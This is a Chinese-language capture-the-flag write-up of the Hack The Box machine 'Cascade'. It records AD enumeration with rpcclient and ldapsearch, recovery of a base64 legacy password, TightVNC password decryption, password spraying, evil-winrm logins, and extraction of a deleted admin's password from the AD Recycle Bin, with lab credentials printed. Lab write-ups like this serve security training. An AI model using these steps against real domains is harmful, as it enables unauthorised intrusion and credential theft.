---
layout: post
title: HTB——Cascade
---

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/Cascade/01.png?raw=true)

# 0x01 信息收集

```bash
 _____                             ___  _             
/__   \ ___   ___   __ _  _ __    / _ \| | _   _  ___ 
  / /\// __| / __| / _' || '_ \  / /_)/| || | | |/ __|
 / /   \__ \| (__ | (_| || | | |/ ___/ | || |_| |\__ \
 \/    |___/ \___| \__,_||_| |_|\/     |_| \__,_||___/

https://github.com/TideSec/TscanPlus
TscanClient Version: 2.7.4  NewVersion: 2.7.6  Expired: 2026.01.01
[05:46:54] [INFO] Start IpScan:10.129.248.184
[05:46:54] [INFO] 开始扫描 1 个主机的 65535 个端口，共 65535 个任务

[05:46:54] [+] 10.129.248.184:53 open
[05:46:54] [+] 10.129.248.184:139 open
[05:46:54] [+] 10.129.248.184:88 open
[05:46:54] [+] 10.129.248.184:389 open
[05:46:54] [+] 10.129.248.184:445 open
[05:46:54] [+] 10.129.248.184:636 open
[05:46:54] [+] 10.129.248.184:135 open
[05:46:54] [+] [TCP/LDAP]  [Microsoft Windows Active Directory LDAP] 10.129.248.184:389 [0.!.d.0.0.&.currentTime1.20250408051935.0Z0.V.subs]
[05:46:54] [INFO] start LDAP check 10.129.248.184:389
[05:46:54] [+] 开始 LdapScan 任务: LDAP://10.129.248.184:389
[05:46:54] [+] [TCP/NETBIOS]  [Microsoft Windows netbios-ssn] 10.129.248.184:139 [.]
[05:46:55] [+] [TCP/RPC]  [Microsoft Windows RPC] 10.129.248.184:135 [.@]
[05:46:55] [INFO] start WMI check 10.129.248.184:135
[05:46:55] [+] 开始 WmiExec 任务: WMI://10.129.248.184:135
[05:46:58] [+] [TCP/MICROSOFT-DS]   10.129.248.184:445 
[05:46:58] [INFO] start SMB check 10.129.248.184:445
[05:46:58] [+] 开始 SmbScan 任务: SMB://10.129.248.184:445
[05:47:01] [+] [TCP/SPARK]  [Apache Spark] 10.129.248.184:88 [.]
[05:47:03] [+] 10.129.248.184:3268 open
[05:47:03] [+] 10.129.248.184:3269 open
[05:47:07] [+] [TCP/LDAP]  [Microsoft Windows Active Directory LDAP] 10.129.248.184:3268 [0.!.d.0.0.&.currentTime1.20250408051949.0Z0.V.subs]                                                     
[05:47:07] [INFO] start LDAP check 10.129.248.184:3268
[05:47:07] [+] 开始 LdapScan 任务: LDAP://10.129.248.184:3268
[05:47:15] [+] 10.129.248.184:5985 open
[05:47:22] [+] [TCP/HTTP] [404] [Microsoft-HTTPAPI/2.0][Microsoft HTTPAPI httpd 2.0] http://10.129.248.184:5985 [Not Found]
[05:47:22] [INFO] start WinRM check 10.129.248.184:5985
[05:47:22] [+] 开始 WinRMScan 任务: WinRM://10.129.248.184:5985
[05:49:57] [+] 10.129.248.184:49155 open
[05:49:57] [+] 10.129.248.184:49154 open
[05:49:57] [+] 10.129.248.184:49157 open
[05:49:57] [+] 10.129.248.184:49158 open
[05:49:57] [+] 10.129.248.184:49165 open
[05:49:57] [+] [TCP/HTTP]  [([\d.]+)$| p 1.0] ncacn-http://10.129.248.184:49157 [ncacn_http/1.0]
[05:50:16] [+] [TCP/UNKNOWN]   10.129.248.184:49165 
[05:50:16] [+] [TCP/UNKNOWN]   10.129.248.184:49158 
[05:50:19] [+] [TCP/UNKNOWN]   10.129.248.184:49155 
[05:50:19] [+] [TCP/UNKNOWN]   10.129.248.184:49154 
                                                           
[05:51:00] [+] alive ports is: 15
[05:51:00] [+] Ip扫描结束:10.129.248.184
[05:51:00] [INFO] Start UrlScan:http://10.129.248.184:5985
[05:51:01] [+] [TCP/HTTP] [404] [Microsoft-HTTPAPI/2.0] http://10.129.248.184:5985 [Not Found]
                                                 
[05:51:01] [+] Url扫描结束:http://10.129.248.184:5985
[05:51:01] [+] 项目任务完成:Default, Timeuse：246.929830106
[05:51:01] [+] 扫描结束,耗时: 4m7.204054832s
```

没有任何暴露的web服务，估计是需要我们域内枚举用户后AS-REP了。首先通过RPC枚举一下域内用户。使用`rpcclient`无账密连接后查看域内所有用户并收集为字典。

```bash
┌──(root㉿kali)-[/home/kali]
└─# rpcclient -U "" -N 10.129.248.184
rpcclient $> enumdomusers
user:[CascGuest] rid:[0x1f5]
user:[arksvc] rid:[0x452]
user:[s.smith] rid:[0x453]
user:[r.thompson] rid:[0x455]
user:[util] rid:[0x457]
user:[j.wakefield] rid:[0x45c]
user:[s.hickson] rid:[0x461]
user:[j.goodhand] rid:[0x462]
user:[a.turnbull] rid:[0x464]
user:[e.crowe] rid:[0x467]
user:[b.hanson] rid:[0x468]
user:[d.burman] rid:[0x469]
user:[BackupSvc] rid:[0x46a]
user:[j.allen] rid:[0x46e]
user:[i.croft] rid:[0x46f]
```

---

# 0x02 ldapsearch获取

根据HTB提示，我们使用`ldapsearch`来查询`r.thompson`用户的具体信息。但请注意，我们需要先使用`samba-tool`来获取完整的域内信息。如果不知道完整域名我们是没有办法查询的。

```bash
┌──(root㉿kali)-[/home/kali]
└─# samba-tool domain info 10.129.248.184     
Forest           : cascade.local
Domain           : cascade.local
Netbios domain   : CASCADE
DC name          : CASC-DC1.cascade.local
DC netbios name  : CASC-DC1
Server site      : Default-First-Site-Name
Client site      : Default-First-Site-Name



┌──(root㉿kali)-[/home/kali]
└─# ldapsearch -x -H ldap://10.129.248.184 -b "DC=cascade,DC=local" "(objectClass=user)" 
# Ryan Thompson, Users, UK, cascade.local
dn: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Ryan Thompson
sn: Thompson
givenName: Ryan
distinguishedName: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local
instanceType: 4
whenCreated: 20200109193126.0Z
whenChanged: 20200323112031.0Z
displayName: Ryan Thompson
uSNCreated: 24610
memberOf: CN=IT,OU=Groups,OU=UK,DC=cascade,DC=local
uSNChanged: 295010
name: Ryan Thompson
objectGUID:: LfpD6qngUkupEy9bFXBBjA==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 132247339091081169
lastLogoff: 0
lastLogon: 132247339125713230
pwdLastSet: 132230718862636251
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAMvuhxgsd8Uf1yHJFVQQAAA==
accountExpires: 9223372036854775807
logonCount: 2
sAMAccountName: r.thompson
sAMAccountType: 805306368
userPrincipalName: r.thompson@cascade.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local
dSCorePropagationData: 20200126183918.0Z
dSCorePropagationData: 20200119174753.0Z
dSCorePropagationData: 20200119174719.0Z
dSCorePropagationData: 20200119174508.0Z
dSCorePropagationData: 16010101000000.0Z
lastLogonTimestamp: 132294360317419816
msDS-SupportedEncryptionTypes: 0
cascadeLegacyPwd: clk0bjVldmE=
```

可以看到最底部有一个`cascadeLegacyPwd`字段，存储着该账户base64过的密码。解密可得`rY4n5eva`.得到此账户后，我们借助SMB服务查看其共享的目录。

```bash
┌──(root㉿kali)-[/home/kali]
└─# smbclient -L //10.129.248.184 -U r.thompson
Password for [WORKGROUP\r.thompson]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        Audit$          Disk      
        C$              Disk      Default share
        Data            Disk      
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        print$          Disk      Printer Drivers
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.248.184 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

`Data`内估计就存着我们想要的数据。继续跟进。在`DCs`文件夹内发现一个`.log`文件，我们将其下载下来。

```bash
┌──(root㉿kali)-[/home/kali/HTB/Cascade]
└─# smbclient //10.129.248.184/Data -U r.thompson
Password for [WORKGROUP\r.thompson]:
Try "help" to get a list of possible commands.
smb: \> cd IT
smb: \IT\> mask ""
smb: \IT\> recurse on //ON
smb: \IT\> prompt off //关闭询问是否下载
smb: \IT\> mget *
getting file \IT\Email Archives\Meeting_Notes_June_2018.html of size 2522 as Email Archives/Meeting_Notes_June_2018.html (5.8 KiloBytes/sec) (average 5.8 KiloBytes/sec)
getting file \IT\Logs\Ark AD Recycle Bin\ArkAdRecycleBin.log of size 1303 as Logs/Ark AD Recycle Bin/ArkAdRecycleBin.log (3.1 KiloBytes/sec) (average 4.5 KiloBytes/sec)
getting file \IT\Logs\DCs\dcdiag.log of size 5967 as Logs/DCs/dcdiag.log (11.4 KiloBytes/sec) (average 7.1 KiloBytes/sec)
```

---

# 0x03 VNC解密

除去一个log文件，我们还下载到一个注册表文件`.reg`。注意需使用`mget`下载，普通的get方式不能下载，暂不清楚成因。注意到下载的`.reg`注册表文件中有一个`HEX`形式的password，但是得需要使用VNC工具先解密一次。

```bash
Windows Registry Editor Version 5.00
[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC]
[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC\Server]
"ExtraPorts"=""
......
"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
```

将此password经过一次HEX解密后我们还需要使用特定脚本进行解密，这里不再赘述原理。

- [jeroennijhof/vncpwd: VNC Password Decrypter](https://github.com/jeroennijhof/vncpwd)

```bash
┌──(root㉿kali)-[/home/kali/HTB/Cascade]
└─# cd vncpwd-0.1   
                                                                                                 
┌──(root㉿kali)-[/home/kali/HTB/Cascade/vncpwd-0.1]
└─# ls
d3des.c  d3des.h  LICENSE  Makefile  README  vncpwd.c
                                                                                                 
┌──(root㉿kali)-[/home/kali/HTB/Cascade/vncpwd-0.1]
└─# gcc -o vncpwd vncpwd.c d3des.c                    
                                                                                                 
┌──(root㉿kali)-[/home/kali/HTB/Cascade/vncpwd-0.1]
└─# echo '6bcf2a4b6e5aca0f' | xxd -r -p > vnc_enc_pass
                                                                                                 
┌──(root㉿kali)-[/home/kali/HTB/Cascade/vncpwd-0.1]
└─# ./vncpwd vnc_enc_pass                             
Password: sT333ve2
```

得到了此密码，但我们却不是很清楚这是谁的密码。通过翻看下载下来的`.html`文件我们得知2018年底将要删除的是`TempAdmin`用户。通过上面得到的账密+一开始得到的账户列表做域内密码喷洒，得知此密码是`s.smith`账户的密码。尝试`evil-winrm`登录，发现可以登录，至此我们获得了`user.txt`

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/Cascade/02.png?raw=true)

接下来我们查看`s.smith`的详细信息。经审计发现`s.smith`是属于`Audit Share`组别的。那我们尝试将SMB共享目录中所有与此组别有关的文件全部下载下来。

```bash
*Evil-WinRM* PS C:\Users\s.smith\Desktop> net user s.smith /domain
User name                    s.smith
Full Name                    Steve Smith
Comment
User's comment
Country code                 000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/28/2020 8:58:05 PM
Password expires             Never
Password changeable          1/28/2020 8:58:05 PM
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script                 MapAuditDrive.vbs
User profile
Home directory
Last logon                   1/29/2020 12:26:39 AM

Logon hours allowed          All

Local Group Memberships      *Audit Share          *IT
                             *Remote Management Use
Global Group memberships     *Domain Users
The command completed successfully.
```

与上文相关的SMB文件获取过程，不再赘述。我们先查看薅下来的db数据库文件中是否有重要信息。经过Re手的调试后，我们成功还原`ArkSvc`的加密密码，加密后为`BQO5l5Kj9MdErXx6Q6AGOw==`,原密码为`w3lc0meFr31nd`.使用此账密登录，我们发现此账户的一些特权之处。

```bash
*Evil-WinRM* PS C:\Users\arksvc\Documents> net user Arksvc /domain
User name                    arksvc
Full Name                    ArkSvc
Comment
User's comment
Country code                 000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/9/2020 5:18:20 PM
Password expires             Never
Password changeable          1/9/2020 5:18:20 PM
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   1/29/2020 10:05:40 PM

Logon hours allowed          All

Local Group Memberships      *AD Recycle Bin       *IT
                             *Remote Management Use
Global Group memberships     *Domain Users
The command completed successfully.
```

---

# 0x04 AD Recycle Bin组获取被删除的信息

此账户属于`AD Recycle Bin`特权组。详情见Windows Active Directory域 用户组权限滥用权限提升相关细节。

- [谈谈域渗透中常见的可滥用权限及其应用场景（二） - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/system/352772.html)

回想起之前在`email`中被删掉的`TempAdmin`，我们是否可以使用`Recycle`权限恢复此用户，并籍此获取管理员权限。首先我们查询回收站记录，并尝试获得TempAdmin的密码。

```bash
*Evil-WinRM* PS C:\Users\arksvc\Documents> Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects


Deleted           : True
DistinguishedName : CN=CASC-WS1\0ADEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe,CN=Deleted Objects,DC=cascade,DC=local
Name              : CASC-WS1
                    DEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe
ObjectClass       : computer
ObjectGUID        : 6d97daa4-2e82-4946-a11e-f91fa18bfabe

Deleted           : True
DistinguishedName : CN=Scheduled Tasks\0ADEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2,CN=Deleted Objects,DC=cascade,DC=local
Name              : Scheduled Tasks
                    DEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2
ObjectClass       : group
ObjectGUID        : 13375728-5ddb-4137-b8b8-b9041d1d3fd2

Deleted           : True
DistinguishedName : CN={A403B701-A528-4685-A816-FDEE32BDDCBA}\0ADEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e,CN=Deleted Objects,DC=cascade,DC=local
Name              : {A403B701-A528-4685-A816-FDEE32BDDCBA}
                    DEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e
ObjectClass       : groupPolicyContainer
ObjectGUID        : ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e

Deleted           : True
DistinguishedName : CN=Machine\0ADEL:93c23674-e411-400b-bb9f-c0340bda5a34,CN=Deleted Objects,DC=cascade,DC=local
Name              : Machine
                    DEL:93c23674-e411-400b-bb9f-c0340bda5a34
ObjectClass       : container
ObjectGUID        : 93c23674-e411-400b-bb9f-c0340bda5a34

Deleted           : True
DistinguishedName : CN=User\0ADEL:746385f2-e3a0-4252-b83a-5a206da0ed88,CN=Deleted Objects,DC=cascade,DC=local
Name              : User
                    DEL:746385f2-e3a0-4252-b83a-5a206da0ed88
ObjectClass       : container
ObjectGUID        : 746385f2-e3a0-4252-b83a-5a206da0ed88

Deleted           : True
DistinguishedName : CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
Name              : TempAdmin
                    DEL:f0cc344d-31e0-4866-bceb-a842791ca059
ObjectClass       : user
ObjectGUID        : f0cc344d-31e0-4866-bceb-a842791ca059



*Evil-WinRM* PS C:\Users\arksvc\Documents> Get-ADObject -filter { SAMAccountName -eq "TempAdmin" } -includeDeletedObjects -property *


accountExpires                  : 9223372036854775807
badPasswordTime                 : 0
badPwdCount                     : 0
CanonicalName                   : cascade.local/Deleted Objects/TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz
CN                              : TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
codePage                        : 0
countryCode                     : 0
Created                         : 1/27/2020 3:23:08 AM
createTimeStamp                 : 1/27/2020 3:23:08 AM
Deleted                         : True
Description                     :
DisplayName                     : TempAdmin
DistinguishedName               : CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
dSCorePropagationData           : {1/27/2020 3:23:08 AM, 1/1/1601 12:00:00 AM}
givenName                       : TempAdmin
instanceType                    : 4
isDeleted                       : True
LastKnownParent                 : OU=Users,OU=UK,DC=cascade,DC=local
lastLogoff                      : 0
lastLogon                       : 0
logonCount                      : 0
Modified                        : 1/27/2020 3:24:34 AM
modifyTimeStamp                 : 1/27/2020 3:24:34 AM
msDS-LastKnownRDN               : TempAdmin
Name                            : TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                  :
ObjectClass                     : user
ObjectGUID                      : f0cc344d-31e0-4866-bceb-a842791ca059
objectSid                       : S-1-5-21-3332504370-1206983947-1165150453-1136
primaryGroupID                  : 513
ProtectedFromAccidentalDeletion : False
pwdLastSet                      : 132245689883479503
sAMAccountName                  : TempAdmin
sDRightsEffective               : 0
userAccountControl              : 66048
userPrincipalName               : TempAdmin@cascade.local
uSNChanged                      : 237705
uSNCreated                      : 237695
whenChanged                     : 1/27/2020 3:24:34 AM
whenCreated                     : 1/27/2020 3:23:08 AM
```

将此账户`TempAdmin:baCT3r1aN00dles`薅出来之后，我们发现此密码可以用于登录`Administrator`账户。至此我们拿下了`root.txt`

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/Cascade/03.png?raw=true)